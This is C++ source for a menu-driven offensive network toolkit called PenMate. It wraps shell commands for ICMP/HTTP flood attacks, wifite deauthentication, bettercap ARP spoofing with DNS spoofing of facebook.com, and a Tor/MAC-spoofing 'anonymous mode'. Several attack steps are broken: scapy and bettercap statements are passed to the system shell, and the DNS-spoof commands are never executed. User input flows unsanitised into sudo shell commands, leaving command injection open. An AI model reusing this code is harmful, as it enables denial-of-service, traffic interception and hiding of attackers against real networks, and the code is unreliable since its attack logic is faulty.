#include <iostream>
#include <ctime>
#include <iomanip>
#include <unistd.h>   
#include <signal.h>   
#include <sys/types.h> 
#include <cctype> 
#include <sys/wait.h>  
#include <string>
#include <sstream>     
#include <vector> 
#include <fstream>     
#include <cstdlib>     
#include <thread> 
#include <chrono> 
#include <algorithm>
#include "obtainipaddr.h"
#include "firmwareVerifier.h"
#include <readline/readline.h> 
#include <readline/history.h>   
#include <curl/curl.h>
#include <regex>      
#include <mosquitto.h>
#include <openssl/ssl.h>
std::string myIPAddress;

// Function prototypes
void displayLogo();
void quickNote();
void displayLoadingScreen();
void displayLoadingAnimation(); 
void displayInstructions();
std::string getWirelessNIC();

void commandAutomator();
void networkRipper();
void saveCommandSequence(const std::vector<std::string>& commands, const std::string& filename);
void chooseTool(); // New function for tool selection
void signalHandler(int signum); // Signal handler prototype

////////////////////////////////////////////////////////////////////////////////////////////////////
// Function to execute commands in a shell
void executeCommand(const std::string& command) {
    int result = system(command.c_str()); // Use system() for shell command execution
    if (result == -1) {
        std::cerr << "\033[31mError executing command: " << command << "\033[0m" << std::endl;
    }
}

void signalHandler(int signum) {
    std::cout << "\nReturning to main menu...\n" << std::endl;
    chooseTool(); // Call the tool selection again
}
void displayUsage() {
    std::cout << "Version: 1.0" << std::endl;
    std::cout << "Usage: penmate [-h] [-anon] [-bait] [-verify]" << std::endl;
    std::cout << "Options:" << std::endl;
    std::cout << "  -h           Display this help message" << std::endl;
    std::cout << "  -anon        Enable anonymous mode" << std::endl;
    std::cout << "  -bait        Enable bait mode" << std::endl;
    std::cout << "  -verify      Verify system dependencies" << std::endl;
    std::cout << std::endl;
}
void verifyDependencies() {
    std::cout << "Verifying dependencies..." << std::endl;

    // List of required dependencies
    const std::string dependencies[] = {
        "scapy",
        "bettercap",
        "nmap",
        "wireshark",
        "python3",
        "net-tools",
        "macchanger",
        "iptables"
    };

    bool allDependenciesInstalled = true;

    // Check each dependency
    for (const auto& dep : dependencies) {
        std::string command = "which " + dep + " > /dev/null 2>&1";
        int result = system(command.c_str());

        if (result != 0) {
            std::cerr << "Error: " << dep << " is not installed." << std::endl;
            allDependenciesInstalled = false;
        } else {
            std::cout << dep << " is installed." << std::endl;
        }
    }

    if (allDependenciesInstalled) {
        std::cout << "All dependencies are installed." << std::endl;
    } else {
        std::cerr << "Please install the missing dependencies and try again." << std::endl;
    }
}

void displayLogo() {
    std::cout << "\033[35m" <<   // Dark Purple
    R"( 
    ____             __  ___      __     
   / __ \___  ____  /  |/  /___ _/ /____ 
  / /_/ / _ \/ __ \/ /|_/ / __ `/ __/ _ \
 / ____/  __/ / / / /  / / /_/ / /_/  __/
/_/    \___/_/ /_/_/  /_/\__,_/\__/\___/ 
    )" << "\033[0m" << std::endl; 
}

void displayLoadingAnimation() {
    const int total = 50; 
    std::cout << "LOADING [";
    for (int i = 0; i <= total; ++i) {
        std::cout << "\rLOADING [";
        for (int j = 0; j < total; ++j) {
            if (j < i) {
                std::cout << "#"; 
            } else {
                std::cout << " "; 
            }
        }
        std::cout << "] " << (i * 2) << "%"; 
        std::cout.flush();
        std::this_thread::sleep_for(std::chrono::milliseconds(70)); 
    }
    std::cout << "\n"; 
}

void displayLoadingScreen() {
    std::cout << R"( 
⢰⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⢧⠨⠢⡀⠀⠀⠀⠀⠀⠀⠲⢒⠒⠦⠤⣀⡀⠀⠀⠀⠀⢀⣠⣤⠴⠒⠋⠙⡄
⠀⠸⠀⠐⢱⠀⠀⠀⠀⠀⠀⢀⣈⠦⠤⠀⠒⠊⠉⠉⠀⠈⠁⣀⠭⠀⢀⣀⣀⣹     CSSHARK
⠀⠀⠖⠀⠃⠓⢤⠖⠒⠚⠉⠀⠀⡀⠀⠀⠀⢀⣰⢴⠶⠐⢈⣴⣿⠟⠿⢻⣿⡞    SECURITY
⠀⢠⠀⠀⠀⡤⢤⣄⠀⠀⠤⠤⠀⠀⣐⠄⠀⠼⡏⡧⠄⢢⡾⠋⠀⠀⢠⣎⡟    PROJECTS
⢠⠃⣀⠴⠋⠀⠀⠈⠑⠢⢄⣀⣠⠊⠀⢀⠎⠀⠡⠅⠀⠻⢿⣤⣤⡴⣾⣴⣿   2025
⡬⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⡼⠃⣠⠶⣇⣀⣀⠀⠀⠀⠀⠀⣀⣌⡠⠤⠘⠋⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣔⡡⠚⠁⠀⠀⠀⠈⠉⠉⠉⠻⡍⠙⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠃⠀⠀)" << std::endl; 

    // did u rly tought something is going on under this loading screen? 
    std::this_thread::sleep_for(std::chrono::milliseconds(4000));
    executeCommand("clear");
}

void displayHelp() {
    std::cout << "Application supports Linux Terminal (with bash setting) interaction and provides executing simple scans or attacks." << std::endl; 
    std::cout << "\e[1mPrivileges:\e[0m It is recommended to run toolset with 'sudo' to give access to read wireless NIC and generate scripts." << std::endl;
    std::cout << "\e[1mCommandAutomator:\e[0m tool that supports automation process by recording all command executed in linux terminal. Most applications for Kali Linux communicate through a terminal, so you can easily generate scripts to automate processes." << std::endl; 
    std::cout << "\e[1mNetworkRipper:\e[0m module that uses many known tools automatically and provides some of the custom ones. Wireless and local network pentest supported." << std::endl;
    std::cout << "\e[1mWebExposer:\e[0m module for web penetration testing. Relies on tools such as nikto, sqlmap, wfuzz, skipfish and exploits many of the vulnerabilities that have been studied, as well as the latest ones, to launch attacks against websites. " << std::endl;
    std::cout << "\e[1mHotlineCutter:\e[0m Android penetration testing tools combined together. Mobile devices penetration testing is not so frequent like network/web/hardware but it is also important for company infrastructure." << std::endl; 
}

void quickNote() {
    std::cout << "Auditing Toolbox version 1.0." << std::endl; 
    std::cout << "Relies on many penetration testing tools distributed as open source." << std::endl;
    std::cout << "" << std::endl; 
    std::cout << "All dependencies should be satisfied in \033[31mKali Linux OS\33[0m." << std::endl; 
    std::cout << std::endl; 
}

void displayAutomatorInstructions() {
    std::cout << "Usage: Enter the command you want to run." << std::endl;
    std::cout << "Type 'savesqnc <filename>.sh' to save the command sequence." << std::endl;
}

std::string toLower(const std::string& str) {
    std::string lowerStr = str;
    std::transform(lowerStr.begin(), lowerStr.end(), lowerStr.begin(),
                   [](unsigned char c) { return std::tolower(c); });
    return lowerStr;
}

void state() {
    std::cout << "\n-----------------------------------\n";
    std::cout << "System State Information\n";
    std::cout << "-----------------------------------\n";

    // Get local time zone
    std::cout << "Local Timezone: " << std::endl;
    system("date '+%Z %z'"); // Displays the timezone information

    // Get open ports and services
    std::cout << "\nOpen Ports and Services:\n";
    system("netstat -tuln"); // Displays network connections

    // Get operating system details
    std::cout << "\nOperating System Details:\n";
    system("lsb_release -a"); // Debian-based systems
    // Alternatively, you can use "uname -a" for general information
    // system("uname -a");

    // Get NmapInfo, UFW, 
    std::cout << "Running nmap scan:" << std::endl; 
    std::string myIPAddress = getIPv4Address();
    std::string commandtopass = "sudo nmap " + myIPAddress; 
    executeCommand(commandtopass); 
    std::cout << "Firewall status check:" << std::endl;
    std::string ufwcheck = "sudo ufw status";
    executeCommand(ufwcheck);

    std::cout << "-----------------------------------\n\n";
}

void localMachineIPv4() {
    std::string myIPAddress = getIPv4Address();

    if (!myIPAddress.empty()) {
        std::cout << "Your IPv4 Address is: \033[35m" + myIPAddress << "\033[0m" << std::endl;
    } else {
        std::cout << "No IPv4 address found." << std::endl;
    }
}
std::string getCurrentDateTime() {
    auto now = std::chrono::system_clock::now();
    std::time_t nowTimeT = std::chrono::system_clock::to_time_t(now);
    
    std::tm nowTm = *std::localtime(&nowTimeT); 

    // Format date and time
    std::stringstream ss;
    ss << std::put_time(&nowTm, "%Y-%m-%d_%H-%M-%S"); // Format: YYYY-MM-DD_HH-MM-SS
    return ss.str();
}

// Function to retrieve wireless NIC
std::string getWirelessNIC() {
    const char* command = "iwconfig";
    FILE* pipe = popen(command, "r");
    if (!pipe) {
        std::cerr << "popen() failed!" << std::endl;
        return "";
    }

    char buffer[128];
    std::string result;

    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer; // Append each line
    }
    pclose(pipe);

    std::istringstream iss(result);
    std::string line;
    std::string wirelessNIC;

    while (std::getline(iss, line)) {
        if (line.find("IEEE 802.11") != std::string::npos) { // Look for wireless interface
            std::istringstream lineStream(line);
            lineStream >> wirelessNIC; // Get the interface name
            break; // Found the first wireless NIC, exit the loop
        }
    }

    return wirelessNIC; // Return found NIC or empty string if not found
}

void saveCommandSequence(const std::vector<std::string>& commands, const std::string& filename) {
    std::ofstream scriptFile(filename);
    if (scriptFile.is_open()) {
        scriptFile << "#!/bin/bash\n\n"; // bash shebang 
        for (const auto& cmd : commands) {
            scriptFile << cmd << "\n"; // Write commands to script
        }
        std::cout << "Command sequence saved to " << filename << std::endl;
        scriptFile.close();

        // Grant execute privileges to the file 
        std::string chmodCommand = "chmod +x " + filename;
        executeCommand(chmodCommand);
    } else {
        std::cerr << "Failed to open file for writing: " << filename << std::endl;
    }
}

void commandAutomator() {
    displayAutomatorInstructions();
    std::string command;
    std::vector<std::string> commandSequence;

    while (true) {
        std::cout << "CommandAutomator - Enter terminal command (type 'exit' to quit): ";
        std::getline(std::cin, command);

        if (command == "exit") {
            break; // Exit the loop
        } else if (command.rfind("savesqnc ", 0) == 0) {
            // Save command sequence
            std::string filename = command.substr(9); // Get the filename part
            if (!filename.empty()) {
                saveCommandSequence(commandSequence, filename);
                commandSequence.clear(); // Clear the sequence after saving
            } else {
                std::cerr << "Invalid filename." << std::endl;
            }
            continue; // Skip command execution
        }

        commandSequence.push_back(command); // Store the command in the sequence
        executeCommand(command);
    }
}

std::string convertToNetworkAddress(const std::string& ipv4Address) {
    // Split the IP address into its octets
    std::istringstream ss(ipv4Address);
    std::string octet;
    std::string networkAddress;

    // Get the first three octets
    for (int i = 0; i < 3; ++i) {
        if (std::getline(ss, octet, '.')) {
            networkAddress += octet; // Add the octet to networkAddress
            if (i < 2) {
                networkAddress += "."; // Append the dot for the first two octets
            }
        }
    }

    // Append "0/24" to complete the CIDR notation
    networkAddress += ".0/24";
    return networkAddress; // return complete CIDR notation
}

void networkRipper() {
    std::string userInput;

    // Get the wireless NIC for potential use
    std::string wirelessNIC = getWirelessNIC();

    std::cout << "\033[1;31m" << R"(
  _   _      _                      _    ____  _                       
 | \ | | ___| |___      _____  _ __| | _|  _ \(_)_ __  _ __   ___ _ __ 
 |  \| |/ _ \ __\ \ /\ / / _ \| '__| |/ / |_) | | '_ \| '_ \ / _ \ '__|
 | |\  |  __/ |_ \ V  V / (_) | |  |   <|  _ <| | |_) | |_) |  __/ |   
 |_| \_|\___|\__| \_/\_/ \___/|_|  |_|\_\_| \_\_| .__/| .__/ \___|_|   
                                                |_|   |_|               
    )" << "\033[0m" << std::endl;
    
    
    if (!wirelessNIC.empty()) {
        std::cout << "Detected Wireless NIC: \033[35m" << wirelessNIC << "\033[0m" << std::endl;
    } else {
        std::cout << "No wireless NIC detected." << std::endl;
    }

    // Ask if the user wants to set the NIC to monitor mode
    while (true) {
        std::cout << "Do you want to set the wireless network interface to monitor mode? [Y/n]: ";
        std::getline(std::cin, userInput);
        userInput = toLower(userInput); // Convert to lowercase

        if (userInput == "y") {
            // Commands to set the NIC to monitor mode
            std::string commandDown = "sudo ip link set " + wirelessNIC + " down";
            std::string commandMonitor = "sudo iw " + wirelessNIC + " set monitor none";
            std::string commandUp = "sudo ip link set " + wirelessNIC + " up";
            executeCommand(commandDown);
            executeCommand(commandMonitor);
            executeCommand(commandUp);
            std::cout << "Successfully switched \033[31m" << wirelessNIC << " into monitor mode!" << std::endl; 
            break; 
        } else if (userInput == "n") {
            std::cout << "You can still change it by command 'nicmode monitor'." << std::endl;
            break; 
        } else {
            std::cout << "Invalid input, please type 'y' or 'n'." << std::endl;
            
        }
    }

    std::cout << "What can I do:" << std::endl;
    std::cout << "- 'scan local network'" << std::endl;
    std::cout << "- 'open ports'" << std::endl;
    std::cout << "- 'DDoS'" << std::endl;
    std::cout << "- 'Deauth'" << std::endl;
    std::cout << "- 'Monitor Network Traffic'" << std::endl;
    std::cout << "- 'MitM Attack'" << std::endl;
    std::cout << "- 'Signal Spectrum'" << std::endl;
    std::cout << "- 'Vulnerability CVE Scanner'" << std::endl; 
    std::cout << std::endl; 
    std::cout << "Detected Wireless NIC: \033[35m" << wirelessNIC << "\033[0m" << std::endl;
    
    std::string myIPAddress = getIPv4Address();
    std::string IPadressRange = convertToNetworkAddress(myIPAddress); // Convert to CIDR range

    while (true) {
        localMachineIPv4();
        std::cout << "Enter goal (from list): ";
        std::getline(std::cin, userInput);
        userInput = toLower(userInput); // Make input lowercase

        if (userInput.find("ddos") != std::string::npos) {
            std::cout << "Enter Target IP:" << std::endl; 
            std::string destinationIP; 
            std::getline(std::cin, destinationIP); 
            std::cout << "Enter Variant (ICMP/HTTP/SYN/ACK/RST Flood input example: ICMP)" << std::endl; 
            std::string variant; 
            std::getline(std::cin, variant); 
            std::string LaunchScapy = "scapy"; 
            executeCommand(LaunchScapy);

            if (variant == "icmp") {
                std::string command1 = "icmpflood = IP(dst='" + destinationIP + "')/ICMP()"; 
                executeCommand(command1);
                std::string command2 = "send(icmpflood, loop=1, verbose=0)"; 
                executeCommand(command2);
            } else if (variant == "http") {
                std::string command3 = "httpflood = IP(dst='" + destinationIP + "')/TCP(dport=80, flags='S')/Raw(load='GET / HTTP/1.1\\r\\nHost: " + destinationIP + "\\r\\n\\r\\n')";
                executeCommand(command3);
                std::string command4 = "send(httpflood, verbose=0)";
                executeCommand(command4);
            }
        } else if (userInput.find("open ports") != std::string::npos) { // OPEN PORTS SCAN
            if (!myIPAddress.empty()){ 
                std::string commandOpenPorts = "sudo nmap " + IPadressRange + " -sC -sV -O"; // customize to reach the user's addressation
                std::cout << "Executing open ports command: " << commandOpenPorts << std::endl;
                executeCommand(commandOpenPorts); 
            }
        } else if (userInput.find("deauth") != std::string::npos) {
            std::string command = "wifite --deauth"; // WIFITE
            std::cout << "Executing Deauth Attack command: " << command << std::endl;
            executeCommand(command);
            std::cout << "What would you like to do next?" << std::endl;
        } else if (userInput.find("monitor") != std::string::npos ||
            userInput.find("monitor local") != std::string::npos ||
            userInput.find("sniff traffic") != std::string::npos ||
            userInput.find("monitor network") != std::string::npos ||
            userInput.find("monitor network traffic") != std::string::npos ||
            userInput.find("sniff") != std::string::npos) { // SNIFFER
            std::string command = "./sniff.sh " + wirelessNIC; 
            std::cout << "Executing network traffic monitoring... " << std::endl;
            executeCommand(command);
            std::cout << "What would you like to do next?" << std::endl;
        } else if (userInput.find("scan") != std::string::npos || 
            userInput.find("scan local network") != std::string::npos || 
            userInput.find("scan network") != std::string::npos || 
            userInput.find("scan local") != std::string::npos) {  
            
            std::string currentDateTime = getCurrentDateTime();
            std::string commandScanLocal = "sudo nmap -sn -PE -PS 21,22,23,25,80,443 -PA 80,443 --source-port 53 -T4 " + IPadressRange + " > nmapscan_" + currentDateTime + ".txt";
            executeCommand(commandScanLocal);
            std::cout << "Checking for hosts OS:" << std::endl; 
            std::string commandScanOS = "sudo nmap -sS " + IPadressRange + " -O > nmapscan_" + currentDateTime + "_OS-Scan.txt";
            executeCommand(commandScanOS);
            std::cout << "output saved to file nmapscan_" + currentDateTime + "_OS-Scan.txt" << std::endl; 
        } else if (userInput.find("cve") != std::string::npos || 
        userInput.find("vscan") != std::string::npos ||
        userInput.find("vulnerability") != std::string::npos ||
        userInput.find("vulnerability scan") != std::string::npos ||
        userInput.find("cve scanner") != std::string::npos ||
        userInput.find("cve scan") != std::string::npos ||
        userInput.find("vulnerability cve scanner") != std::string::npos){
			executeCommand("sudo python3 vscanner.py");
			
		} else if (userInput.find("mitm attack") != std::string::npos || 
            userInput.find("mitm") != std::string::npos ||
            userInput.find("man in the middle") != std::string::npos) { // MiTM 
            std::string commandRunBettercap = "bettercap"; 
            std::cout << "Enter IP address of host to target: "; 
            std::string target_ip_address; 
            std::getline(std::cin, target_ip_address); 
            std::cout << "Enter your IP address (program cannot access it directly):" << std::endl; 
            std::string local_ip_addr; 
            std::getline(std::cin, local_ip_addr); 
            std::cout << "Running bettercap... " << commandRunBettercap << std::endl;
            executeCommand(commandRunBettercap);
            std::cout << "Discovering all hosts in the network..." << std::endl; 
            std::string commandNetProbe = "net.probe on";
            executeCommand(commandNetProbe);
            std::this_thread::sleep_for(std::chrono::milliseconds(10000));
            std::string netShowCommand = "net.show"; 
            executeCommand(netShowCommand); 
            std::cout << "Running ARP Spoofing attack..." << std::endl; 
            std::string ARPspoofcommandParam = "set arp.spoof.fullduplex true";
            std::string ARPspoofTarget = "set arp.spoof.targets " + target_ip_address;
            std::string sniffparam = "net.sniff.local true"; 
            std::string ARPspoofStart = "arp.spoof on"; 
            executeCommand(ARPspoofcommandParam);
            executeCommand(ARPspoofTarget);
            executeCommand(sniffparam);
            executeCommand(ARPspoofStart);
            std::cout << "Performing DNS spoofing..." << std::endl;
            std::string DNScommand = "set dns.spoof.domains facebook.com; set dns.spoof.address " + local_ip_addr;
            std::string DNSspoof = "dns.spoof on"; 
        } else if (userInput.find("nicmode monitor") != std::string::npos){
            std::string commandDown = "sudo ip link set " + wirelessNIC + " down";
            std::string commandMonitor = "sudo iw " + wirelessNIC + " set monitor none";
            std::string commandUp = "sudo ip link set " + wirelessNIC + " up";
            executeCommand(commandDown);
            executeCommand(commandMonitor);
            executeCommand(commandUp);
            std::cout << "Successfully switched \033[31m" << wirelessNIC << " into monitor mode!" << std::endl;     
        } else if (userInput.find("nicmode managed") != std::string::npos) {
    		std::string commandDown = "sudo ip link set " + wirelessNIC + " down";
    		std::string commandManaged = "sudo iw " + wirelessNIC + " set type managed"; // Set to managed mode
    		std::string commandUp = "sudo ip link set " + wirelessNIC + " up";
    		executeCommand(commandDown);
    		executeCommand(commandManaged);
    		executeCommand(commandUp);
    		std::cout << "Successfully switched \033[31m" << wirelessNIC << " back to managed mode!" << std::endl; 
		} else {
			std::cout << "invalid input, does not mach any possible command" << std::endl; 
		}
	
    }
}

// Function to handle command output
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp) {
    userp->append((char*)contents, size * nmemb);
    return size * nmemb;
}


// Modified webExposer function
void webExposer() {
    std::string userInput;

    std::cout << "Welcome to WebExposer!" << std::endl;
	std::cout << "Perform API endpoints reconnaissance with listing possible vulnerabilities? [y/n]:";
	std::cin >> userInput;
	if (userInput == "y"){
		executeCommand("python3 api_scan.py");
	}
	if (userInput == "n"){
		chooseTool();
	}
	

}      

void scanNetwork(const std::string& networkRange) {
	std::string myIPAddress = getIPv4Address();
    std::string IPadressRange = convertToNetworkAddress(myIPAddress); // Convert to CIDR range

    std::string command = "nmap -sn " + IPadressRange + " | grep 'Nmap scan report'";
    std::cout << "Scanning network for IoT devices..." << std::endl;
    system(command.c_str());
}

////////////////////////////////////////////////////MQTT PROTO////////////////////////////////////////////////////////
bool testConnectivityIP(const std::string& ipAddress) {
    std::string command = "ping -c 1 " + ipAddress + " > /dev/null 2>&1";
    int result = system(command.c_str());
    return (result == 0); 
}

// using BSSID
bool testConnectivityBSSID(const std::string& bssid) {
    std::string command = "iwconfig | grep -i " + bssid + " > /dev/null 2>&1";
    int result = system(command.c_str());
    return (result == 0); // Return true if BSSID is found
}

// test connectivity
void testConnectivity() {
    std::string choice;
    std::cout << "Do you want to check connectivity status of a specific device? [y/n]: ";
    std::getline(std::cin, choice);

    if (choice == "y" || choice == "Y") {
        std::string deviceIdentifier;
        std::cout << "Enter the BSSID (MAC address) or IP of the device: ";
        std::getline(std::cin, deviceIdentifier);

        // IP/BSSID input handling
        if (deviceIdentifier.find('.') != std::string::npos) {
            // if IP
            if (testConnectivityIP(deviceIdentifier)) {
                std::cout << "Device with IP " << deviceIdentifier << " is reachable." << std::endl;
            } else {
                std::cout << "Device with IP " << deviceIdentifier << " is NOT reachable." << std::endl;
            }
        } else {
            // if BSSID
            if (testConnectivityBSSID(deviceIdentifier)) {
                std::cout << "Device with BSSID " << deviceIdentifier << " is connected." << std::endl;
            } else {
                std::cout << "Device with BSSID " << deviceIdentifier << " is NOT connected." << std::endl;
            }
        }
    }
}

// test MQTT broker
void mqttTest(const std::string& brokerAddress) {
    mosquitto_lib_init();

    // client instance
    struct mosquitto* mosq = mosquitto_new("IoT_Sentinel", true, nullptr);
    if (!mosq) {
        std::cerr << "Failed to create MQTT client!" << std::endl;
        return;
    }

    // MQTT broker connect 
    std::cout << "Connecting to MQTT broker..." << std::endl;
    if (mosquitto_connect(mosq, brokerAddress.c_str(), 1883, 60) != MOSQ_ERR_SUCCESS) {
        std::cerr << "Failed to connect to MQTT broker!" << std::endl;
        mosquitto_destroy(mosq);
        mosquitto_lib_cleanup();
        return;
    }

    std::cout << "Connected to MQTT broker. Testing for insecure configurations..." << std::endl;

    //  (TLS/SSL)
    std::cout << "\n=== Encryption Check ===" << std::endl;
    if (mosquitto_tls_set(mosq, nullptr, nullptr, nullptr, nullptr, nullptr) == MOSQ_ERR_SUCCESS) {
        std::cout << "TLS/SSL encryption is supported." << std::endl;
    } else {
        std::cerr << "\033[31mWarning:\33[0m TLS/SSL encryption is not enabled. Connection is insecure!" << std::endl;
    }

    // authentication chck
    std::cout << "\n=== Authentication Check ===" << std::endl;
    if (mosquitto_username_pw_set(mosq, "test_user", "test_password") == MOSQ_ERR_SUCCESS) {
        std::cout << "Authentication is supported." << std::endl;
    } else {
        std::cerr << "Warning: Authentication is not required. Connection is insecure!" << std::endl;
    }

    // authorization (AC)
    std::cout << "\n=== Authorization Check ===" << std::endl;
    const char* testTopic = "test/topic";
    if (mosquitto_subscribe(mosq, nullptr, testTopic, 0) == MOSQ_ERR_SUCCESS) {
        std::cout << "Access control is configured for topics." << std::endl;
    } else {
        std::cerr << "Warning: Access control is not properly configured. Topics may be exposed!" << std::endl;
    }

    // topic security
    std::cout << "\n=== Topic Security Check ===" << std::endl;
    if (mosquitto_publish(mosq, nullptr, testTopic, 5, "test", 0, false) == MOSQ_ERR_SUCCESS) {
        std::cout << "Topic security is properly configured." << std::endl;
    } else {
        std::cerr << "Warning: Topic security is not properly configured. Topics may be vulnerable!" << std::endl;
    }

    // fluuush
    mosquitto_disconnect(mosq);
    mosquitto_destroy(mosq);
    mosquitto_lib_cleanup();

    std::cout << "\nMQTT testing complete!" << std::endl;
}
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void IoT_Sentinel() {
    std::string wirelessNIC = getWirelessNIC();
    std::cout << "Detected Wireless NIC: \033[35m" << wirelessNIC << "\033[0m" << std::endl;

    std::string IPadressRange = convertToNetworkAddress(myIPAddress);
    scanNetwork(IPadressRange);

    
    std::cout << "Enter suspicious .bin file path: "; 
    std::string binFilePath; 
	std::getline(std::cin, binFilePath);
    analyzeBinFile(binFilePath);
	
	testConnectivity();
    
    std::string brokerAddress;
    std::cout << "Enter the MQTT broker address: "; //(e.g., test.mosquitto.org)
    std::getline(std::cin, brokerAddress);
    mqttTest(brokerAddress);

    std::cout << "IoT Sentinel scan complete!" << std::endl;
}
void chooseTool() {
    std::string choice;
    while (true) {
        std::cout << "Select Toolset:" << std::endl;
        std::cout << "1. CommandAutomator" << std::endl;
        std::cout << "2. NetworkRipper" << std::endl;
        std::cout << "3. WebExposer" << std::endl; 
        std::cout << "4. IoT Sentinel" << std::endl; 
        std::cout << "Select option: ";
        
        std::cin >> choice;
        std::cin.ignore(); 
        if (choice == "help") {
            displayHelp(); 
        } else if (choice == "1") {
            commandAutomator();
        } else if (choice == "2") {
            networkRipper();
        } else if (choice == "3") {
            std::cout << "\033[1;31mNOTE: \033[0mSet up your apache server for the victim!" << std::endl;
            webExposer();			
        } else if (choice == "4") {
            IoT_Sentinel();
        } else if (choice == "state") { 
            state();
        } else if (choice == "logo") {
            displayLogo();
        } else {
            std::cerr << "Invalid choice. Please try again." << std::endl << "\n"; 
        }
    }
}
///////////////////////////////////////////////MODES/////////////////////////////////////
void anonymousMode() {
    std::cout << "Enabling anonymous mode..." << std::endl;
	std::string wirelessNIC = getWirelessNIC();
    // Spoof MAC address
    std::cout << "Randomizing MAC address..." << std::endl;
    std::string macchangercommand = "sudo macchanger -r " + wirelessNIC;
    executeCommand(macchangercommand);

    // Start Tor service
    std::cout << "Starting Tor service..." << std::endl;
    system("sudo service tor start");

    // Configure Proxychains to use Tor
    std::cout << "Configuring Proxychains..." << std::endl;
    system("sudo sed -i 's/^socks4.*/socks5 127.0.0.1 9050/' /etc/proxychains.conf");

    // Start Privoxy
    std::cout << "Starting Privoxy..." << std::endl;
    system("sudo service privoxy start");

    // Check public IP
    std::cout << "Checking public IP address..." << std::endl;
    system("proxychains curl ifconfig.me");

    std::cout << "Anonymous mode enabled. All traffic is routed through Tor." << std::endl;
}
void togglePortStates(const std::vector<int>& ports, int intervalSeconds) {
    while (true) {
        for (int port : ports) {
            // Open port
            std::string openCommand = "sudo iptables -A INPUT -p tcp --dport " + std::to_string(port) + " -j ACCEPT";
            executeCommand(openCommand);
            std::cout << "Port " << port << " opened." << std::endl;
        }
        std::this_thread::sleep_for(std::chrono::seconds(intervalSeconds));

        for (int port : ports) {
            // Close port
            std::string closeCommand = "sudo iptables -D INPUT -p tcp --dport " + std::to_string(port) + " -j ACCEPT";
            executeCommand(closeCommand);
            std::cout << "Port " << port << " closed." << std::endl;
        }
        std::this_thread::sleep_for(std::chrono::seconds(intervalSeconds));
    }
}
void baitMode(const std::string& wirelessNIC) {
    
    std::vector<int> ports = {21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 8080};
    std::thread portThread(togglePortStates, ports, 5);
    std::string commandDown = "sudo ip link set " + wirelessNIC + " down";
    std::string commandMonitor = "sudo iw " + wirelessNIC + " set monitor none";
    std::string commandUp = "sudo ip link set " + wirelessNIC + " up";
    executeCommand(commandDown);
    executeCommand(commandMonitor);
    executeCommand(commandUp);
    std::cout << "Successfully switched \033[31m" << wirelessNIC << " into monitor mode!" << std::endl;

    std::string command = "./sniff.sh " + wirelessNIC;
    std::cout << "Executing network traffic monitoring... " << std::endl;
    executeCommand(command);

    portThread.join();
}
int main(int argc, char* argv[]) {
    if (argc == 1) {
        std::thread loadingThread(displayLoadingAnimation);
        displayLoadingScreen();

        if (loadingThread.joinable()) {
            loadingThread.join();
        }

        displayLogo();
        quickNote();

        signal(SIGINT, signalHandler);

        chooseTool();

        std::cout << "Exiting." << std::endl;
        return 0;
    }

    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];

        if (arg == "-h") {
            displayUsage();
        } else if (arg == "-anon") {
            anonymousMode();
            std::thread loadingThread(displayLoadingAnimation);
            displayLoadingScreen();

            if (loadingThread.joinable()) {
                loadingThread.join();
            }

            displayLogo();
            quickNote();

            signal(SIGINT, signalHandler);

            chooseTool();

            std::cout << "Exiting." << std::endl;
            return 0;
        } else if (arg == "-bait") {
            std::string wirelessNIC = getWirelessNIC();
            baitMode(wirelessNIC);
        } else if (arg == "-verify") {
            verifyDependencies();
        } else {
            std::cerr << "Unknown option: " << arg << "\n";
            displayUsage();
            return 1;
        }
    }

    return 0;
}
